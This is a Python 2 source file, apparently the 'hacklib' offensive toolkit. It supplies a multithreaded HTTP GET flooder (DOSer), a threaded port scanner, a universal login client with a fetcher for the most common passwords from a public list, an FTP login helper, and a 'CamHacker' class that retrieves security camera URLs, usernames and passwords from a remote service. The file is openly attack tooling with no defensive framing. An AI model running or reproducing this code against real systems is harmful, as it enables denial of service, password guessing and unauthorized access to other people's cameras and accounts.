'''The MIT License (MIT)

Copyright (c) 2016 Leon Li (leon@apolyse.com)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
associated documentation files (the "Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial
portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''

import socket, httplib, threading, time, urllib2
from queue import Queue

class FTPAuth:
    '''FTP login and command handler.
    Commands:
                    login() Args: username, password
                    send() Args: message
    '''

    def __init__(self, IP, port=21):
        self.IP = IP
        self.port = port
        self.username = ''
        self.password = ''
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(8)
        self.s.connect((self.IP, self.port))
        self.s.recv(1024)

    def send(self, message):
        self.s.send(message)
        return self.s.recv(2048)

    def login(self, username, password):
        self.send('USER ' + username + '\r\n')
        response = self.send('PASS ' + password + '\r\n')
        if '230' in response:
            return
        else:
            raise Exception(response)
        

class CamHacker:
    '''Summons a security camera hacker from the cloud.
    '''

    def __init__(self, auth_key):
        self._repository = 'https://apolyse.com/hacklib/cams.php'
        self.auth_key = auth_key

    def _request(self, url):                 
        return urllib2.urlopen(url + '?key=' + self.auth_key).read()

    def hack(self):
        '''Returns cam URL and login details.
        '''
        data = self._request(self._repository)
        if '|' not in data:
            print 'Invalid key.'
            return
        data_list = data.split('|')
        print 'Security Cam URL: ' + data_list[0] + '\n' + 'Username: ' + data_list[1] + '\n' + 'Password: ' + data_list[2]
        return

class AuthClient:
    '''Universal login tool for most login pages as well as HTTP Basic Authentication.
    Commands:
                    login() Args: url, username, password
    '''

    def __init__(self):
        self.url = ''
        self.username = ''
        self.password = ''

    def _get_login_type(self):
        try:
            # Attempts to urlopen target URL without exception
            data = urllib2.urlopen(self.url)
            return 'FORM'
        except Exception, e:
            if 'error 401' in str(e).lower():
                return 'BA'
            if 'timed out' in str(e).lower():
                return 'TO'
            
    def _login_mechanize(self):
        try:
            import mechanize
        except:
            raise Exception('Please install the mechanize module before continuing.')
        # Sets up common input names/ids and creates instance of mechanize.Browser()
        userfields = ['user', 'username', 'usr', 'email', 'name', 'login', 'userid', 'userid-input', 'player']
        passfields = ['pass', 'password', 'passwd', 'pw', 'pwd']
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_refresh(False)
        br.addheaders = [('User-agent', 'googlebot')]
        # Opens URL and lists controls
        response = br.open(self.url)
        loginurl = response.geturl()
        br.form = list(br.forms())[0]
        username_control = ''
        password_control = ''
        # Locates username and password input, and submits login info
        for control in br.form.controls:
            if control.name and control.name.lower() in userfields or control.id and control.id.lower() in userfields: username_control = control
            if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
        username_control.value = self.username
        try: password_control.value = self.password
        except:
            # Detected a username input but not a password input.
            # Submits form with username and attempts to detect password input in resulting page
            response = br.submit()
            br.form = list(br.forms())[0]
            for control in br.form.controls:
                if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
        password_control.value = self.password
        response = br.submit()
        # Returns response if the URL is changed. Assumes login failure if URL is the same
        if response.geturl() != loginurl:
            return response.read()
        else:
            return False

    def _login_BA(self):
        try:
            # Creates a PasswordMgr instance
            passmanager = urllib2.HTTPPasswordMgrWithDefaultRealm()
            passmanager.add_password(None, self.url, self.username, self.password)
            # Creates an auth handling object and builds it with opener
            auth = urllib2.HTTPBasicAuthHandler(passmanager)
            opener = urllib2.build_opener(auth)
            response = opener.open(self.url, timeout=8)
            response.close()
            return True
        except Exception, e:
            print str(e)
            if 'Error 401' in str(e):
                return False
            
    def login(self, url, username, password):
        self.url = url
        self.username = username
        self.password = password
        # ascertain the type of login page given by url
        logintype = self. _get_login_type()
        if logintype == 'BA':
            # attempts to login with BA method and return True
           return self._login_BA()
        if logintype == 'TO':
            print 'Request timed out.'
            return False
        if logintype == 'FORM':
            return self._login_mechanize()

class DOSer:
    '''Hits a host with GET requests on default port 80 from multiple threads.
    Commands:
                    launch() Args: host, duration, threads(default 1), port(default 80),
                    payload(default crocodile)
    '''

    def __init__(self):
        self.target = '127.0.0.1'
        self.port = 80
        self.threads = 1
        self.payload = '?INTERIORCROCODILEALLIGATORIDRIVEACHEVROLETMOVIETHEATER'
        self.start_time = 0
        self.time_length = 1

    def _attack(self, target):  
        # Sends GET requests for time_length duration
        while int(time.time()) < self.start_time + self.time_length:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            try:
                s.connect((self.target, self.port))
                s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
                s.send("Host: " + self.target  + "\r\n\r\n")
            except: pass

    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._attack(self.worker)
            self.q.task_done()

    def launch(self, host, duration, threads = 1, port = 80, payload = 'default'):
        '''Launches threaded GET requests for (duration) seconds.
        '''
        self.target = host
        self.port = port
        self.threads = threads
        self.start_time = int(time.time())
        self.time_length = duration
        if payload != 'default': self.payload = payload
        # Creates queue to hold each thread
        self.q = Queue()
        #print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
        for i in range(threads):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(0, threads):
            self.q.put(worker)

        self.q.join()
        return

class PortScanner:
    '''Scan an IP address using scan(host) with default port range 1-1024.
    Commands:
                    scan() Args: IP, port_range(default 1024), timeout(default 1), verbose(default True)
    '''

    def __init__(self):
        self.IP = '127.0.0.1'
        self.port_range = '1025'
        self.print_lock = threading.Lock()
        self.timeout = 2
        self.openlist = []
        self.verbose = True

    def _portscan(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        # Tries to establish a connection to port, and append to list of open ports
        try:
            con = s.connect((self.IP,port))
            response = s.recv(1024)
            self.openlist.append(port)
            if self.verbose:
                with self.print_lock:
                    print 'Port', str(port) + ':'
                    print response
            s.close()
        # If the connection fails, tries to establish HTTP connection if port is a common HTTP port
        except Exception, e:
            httplist = [80, 81, 443, 1900, 2082, 2083, 8080, 8443]
            if port in httplist:
                try:
                    headers = '''GET /HTTP/1.1
Host: ''' + self.IP + '''
User-Agent: googlebot
Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
                    s.send(headers)
                    response = s.recv(1024)
                    self.openlist.append(port)
                    if self.verbose:
                        with self.print_lock:
                            print 'Port', str(port) + ':'
                            print response
                    s.close()
                except: pass
                
    def portOpen(self, port):
        if port in self.openlist:
            return
        else:
            return False
        
    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._portscan(self.worker)
            self.q.task_done()

    def scan(self, IP, port_range = 1025, timeout = 1, verbose = True):
        '''Scans ports of an IP address. Use getIP() to find IP address of host.
        '''
        self.openlist = []
        self.IP = IP
        self.port_range = port_range
        self.timeout = 1
        # Creates queue to hold each thread
        self.q = Queue()
        for x in range(30):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(1, port_range):
            self.q.put(worker)

        self.q.join()
        
def getIP(host):
    return socket.gethostbyname(host)


def send(IP, port, message, keepalive = False):
    '''Sends a TCP message. If keepalive is true, use hacklib.sock to handle socket.
    '''
    if keepalive:
        global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, port))
    sock.send(message)
    response = sock.recv(2048)
    if not keepalive:
        sock.close()
    return response

def topPasswords(amount):
    '''Get up to 1,000,000 most common passwords.
    '''
    url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt'
    passlist = urllib2.urlopen(url).read().split('\n')
    return passlist[:amount]

